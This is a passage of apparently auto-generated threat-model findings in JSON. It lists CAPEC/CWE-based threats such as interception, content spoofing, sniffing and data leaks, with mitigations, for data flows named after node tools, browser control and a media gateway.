server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "408", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Invoke node tools", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "409", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Invoke node tools", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "410", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Invoke node tools", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "411", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Node tool responses", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "412", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Node tool responses", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "413", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Node tool responses", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "414", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Node tool responses", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "415", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Node tool responses", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "416", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Node tool responses", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "417", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Node tool responses", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "418", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Browser control requests", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "419", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Browser control requests", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "420", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Browser control requests", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "421", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Browser control requests", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "422", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Browser control requests", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "423", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Browser control requests", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "424", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Browser control requests", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "425", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Browser control responses", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "426", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Browser control responses", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "427", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Browser control responses", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "428", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Browser control responses", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "429", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Browser control responses", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "430", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Browser control responses", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "431", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Browser control responses", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "432", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Inbound media to Gateway", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "433", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Inbound media to Gateway", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "434", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Inbound media to Gateway", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "435", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Inbound media to Gateway", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the 